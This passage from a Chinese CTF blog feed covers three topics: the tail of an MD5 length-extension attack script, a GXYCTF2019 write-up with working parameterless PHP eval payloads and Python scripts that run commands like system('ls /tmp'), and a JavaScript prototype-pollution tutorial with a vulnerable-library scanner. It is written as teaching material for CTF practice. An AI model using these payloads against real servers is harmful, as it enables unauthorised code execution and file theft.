class="hljs-number">8</span>)    <span class="hljs-attribute">return</span> pad + str_append<span class="hljs-attribute">def</span> hashmd<span class="hljs-number">5</span>(str):    <span class="hljs-attribute">return</span> hashlib.md<span class="hljs-number">5</span>(str).hexdigest()<span class="hljs-attribute">def</span> check_extension_attack():    <span class="hljs-attribute">for</span> i in range(<span class="hljs-number">1</span>, <span class="hljs-number">65</span>):        <span class="hljs-attribute">s</span> = <span class="hljs-string">&quot;A&quot;</span> * i        <span class="hljs-attribute">mm</span> = md<span class="hljs-number">5</span>py.md<span class="hljs-number">5</span>()        <span class="hljs-attribute">assert</span> hashlib.md<span class="hljs-number">5</span>(s).hexdigest() == mm.my_md<span class="hljs-number">5</span>(s)        <span class="hljs-attribute">print</span> mm.my_md<span class="hljs-number">5</span>(s)    <span class="hljs-attribute">for</span> i in range(<span class="hljs-number">1</span>, <span class="hljs-number">100</span>):        <span class="hljs-attribute">for</span> j in range(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>):            <span class="hljs-attribute">s</span> = &#x27;A&#x27; * i            <span class="hljs-attribute">salt</span> = &#x27;B&#x27; * j            <span class="hljs-attribute">mm</span> = md<span class="hljs-number">5</span>py.md<span class="hljs-number">5</span>()            <span class="hljs-attribute">msg</span> = salt + s + payload(len(salt+s), &#x27;joychou&#x27;)            <span class="hljs-attribute">assert</span> hashmd<span class="hljs-number">5</span>(msg) == mm.extension_attack(hashmd<span class="hljs-number">5</span>(salt+s), &#x27;joychou&#x27;, len(salt+s))<span class="hljs-comment"># check if md5 extension attack is correct</span><span class="hljs-comment"># check_extension_attack()</span><span class="hljs-attribute">if</span> len(sys.argv) &lt; <span class="hljs-number">3</span>:    <span class="hljs-attribute">print</span> <span class="hljs-string">&quot;Usage: &quot;</span>, sys.argv[<span class="hljs-number">0</span>], <span class="hljs-string">&quot; &lt;md5string&gt; &lt;string_to_append&gt; [length of plaintext of md5string]&quot;</span>    <span class="hljs-attribute">sys</span>.exit()<span class="hljs-attribute">hash_origin</span> = sys.argv[<span class="hljs-number">1</span>]<span class="hljs-attribute">str_append</span> = sys.argv[<span class="hljs-number">2</span>]<span class="hljs-attribute">lenth</span> = int(sys.argv[<span class="hljs-number">3</span>])<span class="hljs-attribute">m</span> = md<span class="hljs-number">5</span>py.md<span class="hljs-number">5</span>()<span class="hljs-attribute">str_payload</span> = payload(lenth, str_append)<span class="hljs-attribute">print</span> <span class="hljs-string">&quot;Payload: &quot;</span>, repr(str_payload)<span class="hljs-attribute">print</span> <span class="hljs-string">&quot;Payload urlencode:&quot;</span>, urllib.quote_plus(str_payload)<span class="hljs-attribute">print</span> <span class="hljs-string">&quot;md5:&quot;</span>, m.extension_attack(hash_origin, str_append, lenth)</code></pre><h4 id="修复"><a class="header-anchor" href="#修复">🍭</a>修复</h4><blockquote><p>很多哈希算法都存在Length Extension攻击，这是因为这些哈希算法都使用了Merkle–Damgård construction进行数据的压缩，流行算法比如MD5、SHA-1等都受影响。可将<code>md5($salt.$role)</code>替换成<code>md5($role.$salt)</code></p></blockquote><p>以上为hashdump原理，本题可解：</p><p><img src="/2021/05/05/hash/3.png" alt="3"></p><p>参数传递得到flag：</p><p><img src="/2021/05/05/hash/6.png" alt="6"></p><p>参考：<a href="https://joychou.org/web/hash-length-extension-attack.html#directory079462120078608992">Hash Length Extension Attack</a></p><p><a href="https://blog.csdn.net/qq_42967398/article/details/103549258">BUUCTF WEB [De1CTF 2019]SSRF Me</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>GXYCTF2019|禁止套娃</title>
    <link href="/2021/05/03/GXYctf/"/>
    <url>/2021/05/03/GXYctf/</url>
    
    <content type="html"><![CDATA[<p>这题提到了无参RCE，做个总结。</p><blockquote><p>git泄露源码，利用githack扫出源码:</p><blockquote><pre><code class="hljs php">&gt;&gt;<span class="hljs-meta">&lt;?php</span>&gt;&gt;<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;&gt;&gt;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag在哪里呢？&lt;br&gt;&quot;</span>;&gt;&gt;<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;exp&#x27;</span>]))&#123;   <span class="hljs-keyword">if</span> (!preg_match(<span class="hljs-string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, $_GET[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123;       <span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;;&#x27;</span> === preg_replace(<span class="hljs-string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="hljs-literal">NULL</span>, $_GET[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123;           <span class="hljs-keyword">if</span> (!preg_match(<span class="hljs-string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, $_GET[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123;               <span class="hljs-comment">// echo $_GET[&#x27;exp&#x27;];</span>               @<span class="hljs-keyword">eval</span>($_GET[<span class="hljs-string">&#x27;exp&#x27;</span>]);           &#125;           <span class="hljs-keyword">else</span>&#123;               <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;还差一点哦！&quot;</span>);           &#125;       &#125;       <span class="hljs-keyword">else</span>&#123;           <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;再好好想想！&quot;</span>);       &#125;   &#125;   <span class="hljs-keyword">else</span>&#123;       <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;还想读flag，臭弟弟！&quot;</span>);   &#125;&gt;&gt;&#125;&gt;&gt;<span class="hljs-comment">// highlight_file(__FILE__);</span>&gt;&gt;<span class="hljs-meta">?&gt;</span></code></pre></blockquote></blockquote><h4 id="分析"><a class="header-anchor" href="#分析">🍭</a>分析</h4><ul><li>需要以GET形式传入一个名为exp的参数。如果满足条件会执行这个exp参数的内容。</li><li>过滤了常用的几个伪协议，不能以伪协议读取文件。</li><li>(?R)引用当前表达式，后面加了?递归调用。只能匹配通过无参数的函数。</li><li>正则匹配掉了et/na/info等关键字。</li><li><code>eval($_GET['exp']); </code>无参数RCE</li></ul><p>flag在flag.php,要读取它首先需要得到当前目录下的文件<br>scandir()函数可以扫描当前目录下的文件：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>print_r(scandir(<span class="hljs-string">&#x27;.&#x27;</span>));<span class="hljs-meta">?&gt;</span></code></pre><p>我们需要构造<code>scandir('.')</code>.</p><p>这里需要用到</p><blockquote><p><code>localeconv()</code> 函数</p><blockquote><p>返回一包含本地数字及货币格式信息的数组.</p><p>数组第一项就是.current() 返回数组中的当前单元, 默认取第一个值。<br>pos() 是current() 的别名</p></blockquote></blockquote><p>第一个if就解决了</p><pre><code class="hljs lisp">print_r(<span class="hljs-name">scandir</span>(<span class="hljs-name">current</span>(<span class="hljs-name">localeconv</span>())))<span class="hljs-comment">;</span>print_r(<span class="hljs-name">scandir</span>(<span class="hljs-name">pos</span>(<span class="hljs-name">localeconv</span>())))<span class="hljs-comment">;</span></code></pre><p>测试一下：</p><p><img src="/2021/05/03/GXYctf/1.jpg" alt="1"></p><p>接下来要思考怎么读取倒数第二个数组</p><h4 id="current"><a class="header-anchor" href="#current">🍭</a>current</h4><p><img src="/2021/05/03/GXYctf/2.png" alt="2"></p><p>不能直接读取flag的元素，只能运用其它元素。</p><h4 id="array-reverse"><a class="header-anchor" href="#array-reverse">🍭</a><strong>array_reverse()</strong></h4><p>以相反的元素顺序返回数组</p><pre><code class="hljs reasonml">?exp=print<span class="hljs-constructor">_r(<span class="hljs-params">array_reverse</span>(<span class="hljs-params">scandir</span>(<span class="hljs-params">current</span>(<span class="hljs-params">localeconv</span>()</span>))));</code></pre><h4 id="array-flip"><a class="header-anchor" href="#array-flip">🍭</a>array_flip()</h4><p>交换数组的键和值</p><pre><code class="hljs reasonml">?exp=print<span class="hljs-constructor">_r(<span class="hljs-params">array_flip</span>(<span class="hljs-params">scandir</span>(<span class="hljs-params">current</span>(<span class="hljs-params">localeconv</span>()</span>))));</code></pre><p>array_rand()从数组中随机取出一个或多个单元，不断刷新访问就会不断随机返回，本题目中scandir()返回的数组只有5个元素，刷新几次就能刷出来flag.php</p><pre><code class="hljs reasonml">?exp=print<span class="hljs-constructor">_r(<span class="hljs-params">array_rand</span>(<span class="hljs-params">array_flip</span>(<span class="hljs-params">scandir</span>(<span class="hljs-params">current</span>(<span class="hljs-params">localeconv</span>()</span>)))));</code></pre><h4 id="session-id-session-start"><a class="header-anchor" href="#session-id-session-start">🍭</a><strong>session_id(session_start())</strong></h4><p>本题目虽然ban了hex关键字，导致hex2bin()被禁用，但是我们可以并不依赖于十六进制转ASCII的方式，因为flag.php这些字符是PHPSESSID本身就支持的。<br>使用session之前需要通过session_start()告诉PHP使用session，php默认是不主动使用session的。<br>session_id()可以获取到当前的session id。故手动设置名为PHPSESSID的cookie，并设置值为flag.php</p><h4 id="tips："><a class="header-anchor" href="#tips：">🍭</a>tips：</h4><p>如何读flag.php的源码</p><p>因为et被ban了，所以不能使用file_get_contents()，但是可以可以使用readfile()或highlight_file()以及其别名函数show_source()</p><blockquote><p><code>view-source:http://172.21.4.12:10031/?exp=print_r(readfile(next(array_reverse(scandir(pos(localeconv()))))));</code><br><code>?exp=highlight_file(next(array_reverse(scandir(pos(localeconv())))));</code><br><code>?exp=show_source(session_id(session_start()));</code></p></blockquote><p>得到flag</p><h2 id="无参RCE"><a class="header-anchor" href="#无参RCE">🍭</a>无参RCE</h2><blockquote><blockquote><p>比较常见getshell是<code>eval($_GET['code']);</code><br>但它一般有如下限制</p><pre><code class="hljs autoit"><span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;;&#x27;</span> === preg_replace(<span class="hljs-string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, $_GET[<span class="hljs-string">&#x27;code&#x27;</span>])) &#123;     <span class="hljs-built_in">eval</span>($_GET[<span class="hljs-string">&#x27;code&#x27;</span>])<span class="hljs-comment">;</span>&#125;</code></pre><p>此时我们使用参数则无法通过正则的校验，该正则是我们说的无参数函数的校验，其只允许执行如下格式函数</p><pre><code class="hljs lisp">a(<span class="hljs-name">b</span>(<span class="hljs-name">c</span>()))<span class="hljs-comment">;</span>a()<span class="hljs-comment">;</span></code></pre><p>但不允许</p><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">a</span>(<span class="hljs-string">&#x27;123&#x27;</span>);</span></code></pre></blockquote></blockquote><p>此类题解法：</p><ul><li>利用超全局变量进行bypass，进行RCE</li><li>进行任意文件读取</li></ul><h3 id="bypass"><a class="header-anchor" href="#bypass">🍭</a>bypass</h3><h4 id="getenv"><a class="header-anchor" href="#getenv">🍭</a>getenv()</h4><p>超全局变量：</p><pre><code class="hljs gams"><span class="hljs-meta"><span class="hljs-meta-keyword">$GLOBALS</span></span><span class="hljs-symbol">$</span>_SERVER<span class="hljs-symbol">$</span>_GET<span class="hljs-symbol">$</span>_POST<span class="hljs-symbol">$</span>_FILES<span class="hljs-symbol">$</span>_COOKIE<span class="hljs-symbol">$</span>_SESSION<span class="hljs-symbol">$</span>_REQUEST<span class="hljs-symbol">$</span>_ENV</code></pre><p><code>$_ENV</code>对应函数为<code>getenv()</code></p><p><img src="/2021/05/03/GXYctf/3.png" alt="3"></p><p>但如何取出我们指定的值</p><p><img src="/2021/05/03/GXYctf/4.png" alt="4"></p><p>但是我们想要数组的值，则可以使用：</p><p><img src="/2021/05/03/GXYctf/5.png" alt="5"></p><p>我们可用爆破的方式获取数组中任意位置需要的值，即可使用getenv()获取指定位置的恶意参数</p><h4 id="getallheaders"><a class="header-anchor" href="#getallheaders">🍭</a>getallheaders()</h4><p>上述方法获取的是所有环境变量的列表，我们并不需要这么多信息。仅仅http header即可<br>在apache2环境下，getallheaders()可返回：</p><pre><code class="hljs lsl">array(<span class="hljs-number">8</span>) &#123;     [<span class="hljs-string">&quot;Host&quot;</span>]=&gt; <span class="hljs-type">string</span>(<span class="hljs-number">14</span>) <span class="hljs-string">&quot;106.14.114.127&quot;</span>     [<span class="hljs-string">&quot;Connection&quot;</span>]=&gt; <span class="hljs-type">string</span>(<span class="hljs-number">10</span>) <span class="hljs-string">&quot;keep-alive&quot;</span>     [<span class="hljs-string">&quot;Cache-Control&quot;</span>]=&gt; <span class="hljs-type">string</span>(<span class="hljs-number">9</span>) <span class="hljs-string">&quot;max-age=0&quot;</span>     [<span class="hljs-string">&quot;Upgrade-Insecure-Requests&quot;</span>]=&gt; <span class="hljs-type">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;1&quot;</span>     [<span class="hljs-string">&quot;User-Agent&quot;</span>]=&gt; <span class="hljs-type">string</span>(<span class="hljs-number">120</span>) <span class="hljs-string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36&quot;</span>     [<span class="hljs-string">&quot;Accept&quot;</span>]=&gt; <span class="hljs-type">string</span>(<span class="hljs-number">118</span>) <span class="hljs-string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3&quot;</span>     [<span class="hljs-string">&quot;Accept-Encoding&quot;</span>]=&gt; <span class="hljs-type">string</span>(<span class="hljs-number">13</span>) <span class="hljs-string">&quot;gzip, deflate&quot;</span> [<span class="hljs-string">&quot;Accept-Language&quot;</span>]=&gt; <span class="hljs-type">string</span>(<span class="hljs-number">14</span>) <span class="hljs-string">&quot;zh-CN,zh;q=0.9&quot;</span> &#125;</code></pre><p>我们可以在header中做一些自定义：</p><p><img src="/2021/05/03/GXYctf/6.png" alt="6"></p><p>将结果中的恶意命令取出</p><pre><code class="hljs lisp">var_dump(<span class="hljs-name">end</span>(<span class="hljs-name">getallheaders</span>()))<span class="hljs-comment">;</span></code></pre><p><img src="/2021/05/03/GXYctf/7.png" alt="7"></p><p>http header中的sky变成了我们的参数，可用其进行bypass 无参数函数执行</p><p><img src="/2021/05/03/GXYctf/8.png" alt="8"></p><h4 id="get-defined-vars"><a class="header-anchor" href="#get-defined-vars">🍭</a>get_defined_vars()</h4><p>使用getallheaders()其实具有局限性，因为他是apache的函数，如果目标中间件不为apache，那么这种方法就会失效。我们可以使用get_defined_vars()，首先看一下它的回显</p><p><img src="/2021/05/03/GXYctf/9.png" alt="9"></p><p>可回显全局变量：<code>$_GET$_POST$_FILES$_COOKIE</code>，故可利用GET进行RCE</p><p><img src="/2021/05/03/GXYctf/10.png" alt="10"></p><p>但一般网站喜欢对<code>$_GET$_POST$_COOKIE</code>进行过滤，我们可以尝试从<code>$_FILES</code>下手，这就需要我们自己写一个上传：</p><pre><code class="hljs routeros">import requests<span class="hljs-keyword">from</span> io import BytesIOpayload = <span class="hljs-string">&quot;system(&#x27;ls /tmp&#x27;);&quot;</span>.encode(<span class="hljs-string">&#x27;hex&#x27;</span>)files = &#123;  payload: BytesIO(<span class="hljs-string">&#x27;sky cool!&#x27;</span>)&#125;r = requests.post(<span class="hljs-string">&#x27;http://localhost/skyskysky.php?code=eval(hex2bin(array_rand(end(get_defined_vars()))));&#x27;</span>, <span class="hljs-attribute">files</span>=files, <span class="hljs-attribute">allow_redirects</span>=<span class="hljs-literal">False</span>)<span class="hljs-builtin-name">print</span> r.content</code></pre><p>若不用hex编码进行RCE，空格会被替换成<code>_</code></p><h4 id="session-id"><a class="header-anchor" href="#session-id">🍭</a>session_id()</h4><p><img src="/2021/05/03/GXYctf/11.png" alt="11"></p><p>PHPSESSID允许字母和数字出现，那么我们就有了新的思路，即<code>hex2bin</code><br>脚本如下</p><pre><code class="hljs routeros">import requestsurl = <span class="hljs-string">&#x27;http://localhost/?code=eval(hex2bin(session_id(session_start())));&#x27;</span>payload = <span class="hljs-string">&quot;echo &#x27;sky cool&#x27;;&quot;</span>.encode(<span class="hljs-string">&#x27;hex&#x27;</span>)cookies = &#123;<span class="hljs-string">&#x27;PHPSESSID&#x27;</span>:payload&#125;r = requests.<span class="hljs-builtin-name">get</span>(<span class="hljs-attribute">url</span>=url,cookies=cookies)<span class="hljs-builtin-name">print</span> r.content</code></pre><p>即可达成RCE和bypass的目的</p><h4 id="dirname-chdir"><a class="header-anchor" href="#dirname-chdir">🍭</a>dirname() &amp; chdir()</h4><p>目录遍历读文件，我们可以利用<code>getcwd()</code>获取当前目录</p><pre><code class="hljs reasonml">?code=var<span class="hljs-constructor">_dump(<span class="hljs-params">getcwd</span>()</span>);<span class="hljs-built_in">string</span>(<span class="hljs-number">13</span>) <span class="hljs-string">&quot;/var/www/html&quot;</span></code></pre><p>用<code>scandir()</code>进行当前目录遍历</p><pre><code class="hljs lsl">?code=var_dump(scandir(getcwd()));array(<span class="hljs-number">3</span>) &#123; [<span class="hljs-number">0</span>]=&gt; <span class="hljs-type">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;.&quot;</span> [<span class="hljs-number">1</span>]=&gt; <span class="hljs-type">string</span>(<span class="hljs-number">2</span>) <span class="hljs-string">&quot;..&quot;</span> [<span class="hljs-number">2</span>]=&gt; <span class="hljs-type">string</span>(<span class="hljs-number">9</span>) <span class="hljs-string">&quot;index.php&quot;</span> &#125;</code></pre><p>用<code>dirname()</code>进行目录上跳</p><pre><code class="hljs lsl">?code=var_dump(scandir(dirname(getcwd())));array(<span class="hljs-number">4</span>) &#123; [<span class="hljs-number">0</span>]=&gt; <span class="hljs-type">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;.&quot;</span> [<span class="hljs-number">1</span>]=&gt; <span class="hljs-type">string</span>(<span class="hljs-number">2</span>) <span class="hljs-string">&quot;..&quot;</span> [<span class="hljs-number">2</span>]=&gt; <span class="hljs-type">string</span>(<span class="hljs-number">14</span>) <span class="hljs-string">&quot;flag_phpbyp4ss&quot;</span> [<span class="hljs-number">3</span>]=&gt; <span class="hljs-type">string</span>(<span class="hljs-number">4</span>) <span class="hljs-string">&quot;html&quot;</span> &#125;</code></pre><p>更改当前目录</p><pre><code class="hljs gauss"><span class="hljs-built_in">chdir</span> ( <span class="hljs-keyword">string</span> $directory ) : <span class="hljs-keyword">bool</span></code></pre><p>将 PHP 的当前目录改为 directory。<br>所以我们这里在</p><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">dirname</span>(<span class="hljs-title">getcwd</span>())</span></code></pre><p>进行设置即可</p><pre><code class="hljs lisp">chdir(<span class="hljs-name">dirname</span>(<span class="hljs-name">getcwd</span>()))</code></pre><p>读取<code>/var/www/123</code>:</p><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>localhost/?code=readfile(<span class="hljs-keyword">next</span>(array_reverse(scandir(dirname(chdir(dirname(getcwd())))))));</code></pre><p>即可进行文件读取。</p><p>参考：<a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/#">PHP Parametric Function RCE</a></p><p><a href="https://www.cnblogs.com/wangtanzhi/p/12260986.html">[GXYCTF2019]禁止套娃</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>js原型链污染</title>
    <link href="/2021/04/18/js/"/>
    <url>/2021/04/18/js/</url>
    
    <content type="html"><![CDATA[<h2 id="javascript-回顾"><a class="header-anchor" href="#javascript-回顾">🍭</a>javascript 回顾</h2><blockquote><p>在javascript中，继承的整个过程就称为该类的原型链。</p></blockquote><blockquote><p>每个对象的都有一个指向他的原型(prototype)的内部链接，这个原型对象又有它自己的原型，一直到null为止。</p></blockquote><blockquote><p><strong>在javascript中一切皆对象</strong>，因为所有的变量，函数，数组，对象 都始于object的原型即object.prototype，但只有类有对象，对象没有，对象有的是<code>__proto__</code>，和类的prototype对应，且二者等价。</p></blockquote><blockquote><p>类是通过函数来定义的,定义的这个函数又是这个类的<code>constructor</code>属性值,</p></blockquote><blockquote><p>子类是可以通过prototype链修改其父类以及祖父类的属性值。</p></blockquote><h4 id="继承机制：prototype原型链"><a class="header-anchor" href="#继承机制：prototype原型链">🍭</a>继承机制：prototype原型链</h4><p>日期：</p><pre><code class="hljs xl"><span class="hljs-function"><span class="hljs-title">f</span> -&gt;</span> D<span class="hljs-function"><span class="hljs-title">ata</span>.prototype -&gt;</span> <span class="hljs-function"><span class="hljs-title">object</span>.prototype-&gt;</span>null</code></pre><p>函数：</p><pre><code class="hljs xl"><span class="hljs-function"><span class="hljs-title">d</span> -&gt;</span> <span class="hljs-function"><span class="hljs-title">function</span>.prototype -&gt;</span> <span class="hljs-function"><span class="hljs-title">object</span>.prototype-&gt;</span>null</code></pre><p>数组：</p><pre><code class="hljs xl"><span class="hljs-function"><span class="hljs-title">c</span> -&gt;</span> <span class="hljs-function"><span class="hljs-title">array</span>.prototype -&gt;</span> <span class="hljs-function"><span class="hljs-title">object</span>.prototype-&gt;</span>null</code></pre><p>类：</p><pre><code class="hljs xl"><span class="hljs-function"><span class="hljs-title">b</span> -&gt;</span> <span class="hljs-function"><span class="hljs-title">a</span>.prototype -&gt;</span> <span class="hljs-function"><span class="hljs-title">object</span>.prototype-&gt;</span>null</code></pre><p>当要使用或输出一个变量时：首先会在本层中搜索相应的变量，如果不存在的话，就会向上搜索，即在自己的父类中搜索，当父类中也没有时，就会向祖父类搜索，直到指向null，如果此时还没有搜索到，就会返回 undefined。</p><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">i</span>(<span class="hljs-params"></span>)</span>&#123;    <span class="hljs-built_in">this</span>.a = <span class="hljs-string">&quot;test1&quot;</span>;    <span class="hljs-built_in">this</span>.b = <span class="hljs-string">&quot;test2&quot;</span>;&#125;</code></pre><p><img src="/2021/04/18/js/1.png" alt="1"></p><p>其父类为object，且里面还有许多函数。</p><h2 id="原型链污染"><a class="header-anchor" href="#原型链污染">🍭</a>原型链污染</h2><p>demo：</p><pre><code class="hljs awk"><span class="hljs-regexp">//</span> foo是一个简单的JavaScript对象let foo = &#123;bar: <span class="hljs-number">1</span>&#125;<span class="hljs-regexp">//</span> foo.bar 此时为<span class="hljs-number">1</span>console.log(foo.bar)<span class="hljs-regexp">//</span> 修改foo的原型（即Object）foo.__proto__.bar = <span class="hljs-number">2</span><span class="hljs-regexp">//</span> 由于查找顺序的原因，foo.bar仍然是<span class="hljs-number">1</span>console.log(foo.bar)<span class="hljs-regexp">//</span> 此时再用Object创建一个空的zoo对象let zoo = &#123;&#125;<span class="hljs-regexp">//</span> 查看zoo.barconsole.log(zoo.bar)</code></pre><p>最终zoo.bar的结果为2;因为前面修改了foo的原型<code>foo.__proto__.bar = 2</code>，而foo是一个Object类的实例，所以实际上是修改了Object这个类，给这个类增加了一个属性bar，值为2。后来，又用Object类创建了一个zoo对象<code>let zoo = &#123;&#125;</code>，zoo对象自然也有一个bar属性了。在一个应用中，如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是<strong>原型链污染</strong>。</p><h2 id="原型链污染实例"><a class="header-anchor" href="#原型链污染实例">🍭</a>原型链污染实例</h2><p>原型链污染一般会出现在对象、或数组的键名或属性名可控,而且是赋值语句的情况下。</p><h3 id="一般情况"><a class="header-anchor" href="#一般情况">🍭</a>一般情况</h3><pre><code class="hljs js">obj[a][b] = valueobj[a][b][c] = value<span class="hljs-number">12</span></code></pre><p>如果控制了a,b,c及value就可以进行原型链污染的攻击,可以控制<code>a=__proto__</code></p><h3 id="利用某些API来进行攻击"><a class="header-anchor" href="#利用某些API来进行攻击">🍭</a>利用某些API来进行攻击</h3><h4 id="典型merge操作"><a class="header-anchor" href="#典型merge操作">🍭</a>典型merge操作</h4><ul><li>对象merge</li><li>对象clone（其实内核就是将待操作的对象merge到一个空对象中）</li></ul><p>以对象merge为例：</p><pre><code class="hljs sql">function <span class="hljs-keyword">merge</span>(target, <span class="hljs-keyword">source</span>) &#123;    <span class="hljs-keyword">for</span> (let <span class="hljs-keyword">key</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">source</span>) &#123;        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">key</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">source</span> &amp;&amp; <span class="hljs-keyword">key</span> <span class="hljs-keyword">in</span> target) &#123;            <span class="hljs-keyword">merge</span>(target[<span class="hljs-keyword">key</span>], <span class="hljs-keyword">source</span>[<span class="hljs-keyword">key</span>])        &#125; <span class="hljs-keyword">else</span> &#123;            target[<span class="hljs-keyword">key</span>] = <span class="hljs-keyword">source</span>[<span class="hljs-keyword">key</span>]        &#125;    &#125;&#125;</code></pre><p>在合并的过程中，存在赋值的操作<code>target[key] = source[key]</code>，那么，这个key如果是<code>__proto__</code>，是不是就可以原型链污染呢？</p><p>我们对比一下下面两个demo：</p><p>demo1：</p><pre><code class="hljs apache"><span class="hljs-attribute">let</span> o<span class="hljs-number">1</span> = &#123;&#125;<span class="hljs-attribute">let</span> o<span class="hljs-number">2</span> = &#123;a: <span class="hljs-number">1</span>, <span class="hljs-string">&quot;__proto__&quot;</span>: &#123;b: <span class="hljs-number">2</span>&#125;&#125;<span class="hljs-attribute">merge</span>(o<span class="hljs-number">1</span>, o<span class="hljs-number">2</span>)<span class="hljs-attribute">console</span>.log(o<span class="hljs-number">1</span>.a, o<span class="hljs-number">1</span>.b)<span class="hljs-attribute">o3</span> = &#123;&#125;<span class="hljs-attribute">console</span>.log(o<span class="hljs-number">3</span>.b)</code></pre><p>demo2:</p><pre><code class="hljs apache"><span class="hljs-attribute">let</span> o<span class="hljs-number">1</span> = &#123;&#125;<span class="hljs-attribute">let</span> o<span class="hljs-number">2</span> = JSON.parse(&#x27;&#123;<span class="hljs-string">&quot;a&quot;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&quot;__proto__&quot;</span>: &#123;<span class="hljs-string">&quot;b&quot;</span>: <span class="hljs-number">2</span>&#125;&#125;&#x27;)<span class="hljs-attribute">merge</span>(o<span class="hljs-number">1</span>, o<span class="hljs-number">2</span>)<span class="hljs-attribute">console</span>.log(o<span class="hljs-number">1</span>.a, o<span class="hljs-number">1</span>.b)<span class="hljs-attribute">o3</span> = &#123;&#125;<span class="hljs-attribute">console</span>.log(o<span class="hljs-number">3</span>.b)</code></pre><p>demo1中原型链不会被污染，因为，我们用JavaScript创建o2的过程（<code>let o2 = &#123;a: 1, &quot;__proto__&quot;: &#123;b: 2&#125;&#125;</code>）中，<code>__proto__</code>已经代表o2的原型了，此时遍历o2的所有键名，我们拿到的是<code>[a, b]</code>，<code>__proto__</code>并不是一个key，自然也不会修改Object的原型。</p><p>而demo2在JSON解析的情况下，<code>__proto__</code>会被认为是一个真正的“键名”，而不代表“原型”，所以在遍历o2的时候会存在这个键，故Object已经被污染。</p><h4 id="Property-definition-by-path"><a class="header-anchor" href="#Property-definition-by-path">🍭</a>Property definition by path</h4><pre><code class="hljs reasonml">the<span class="hljs-constructor">Function(<span class="hljs-params">object</span>, <span class="hljs-params">path</span>, <span class="hljs-params">value</span>)</span></code></pre><p>如果攻击者可以控制path,如path=<strong>proto</strong>.myValue.就可以进行污染</p><h4 id="Object-clone"><a class="header-anchor" href="#Object-clone">🍭</a>Object clone</h4><pre><code class="hljs ada"><span class="hljs-keyword">function</span> <span class="hljs-title">clone</span>(obj) &#123;<span class="hljs-keyword">return</span> <span class="hljs-type">merge(&#123;&#125;,</span> obj);&#125;</code></pre><h3 id="找出易受攻击的API"><a class="header-anchor" href="#找出易受攻击的API">🍭</a>找出易受攻击的API</h3><p>node xx.js library-name</p><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> process = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;process&#x27;</span>);<span class="hljs-comment">//check是否收到污染</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"></span>) </span>&#123;<span class="hljs-keyword">if</span> (&#123;&#125;.test == <span class="hljs-string">&quot;123&quot;</span> || &#123;&#125;.test == <span class="hljs-number">123</span>) &#123;<span class="hljs-keyword">delete</span> <span class="hljs-built_in">Object</span>.prototype.test;<span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;&#125;<span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;&#125;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">run</span>(<span class="hljs-params">fnct, sig, name, totest</span>) </span>&#123;<span class="hljs-comment">// Reinitialize to avoid issue if the previous function changed attributes.</span>BAD_JSON = <span class="hljs-built_in">JSON</span>.parse(<span class="hljs-string">&#x27;&#123;&quot;__proto__&quot;:&#123;&quot;test&quot;:123&#125;&#125;&#x27;</span>);<span class="hljs-keyword">try</span> &#123;fnct(totest);&#125; <span class="hljs-keyword">catch</span> (e) &#123;&#125;<span class="hljs-keyword">if</span> (check()) &#123;<span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;Detected : &quot;</span> + name + <span class="hljs-string">&quot; (&quot;</span> + sig + <span class="hljs-string">&quot;)&quot;</span>);&#125;&#125;<span class="hljs-keyword">var</span> BAD_JSON = &#123;&#125;;<span class="hljs-comment">//NULL OBJ</span><span class="hljs-keyword">var</span> args = process.argv.slice(<span class="hljs-number">2</span>);<span class="hljs-comment">//node xx.js param1 param2 parma3获取所有参数 返回数组[param1,param2,param3]</span><span class="hljs-comment">//忽略异常</span>process.on(<span class="hljs-string">&#x27;uncaughtException&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">err</span>) </span>&#123; &#125;);<span class="hljs-keyword">var</span> pattern = [&#123;fnct : <span class="hljs-function"><span class="hljs-keyword">function</span> (<span 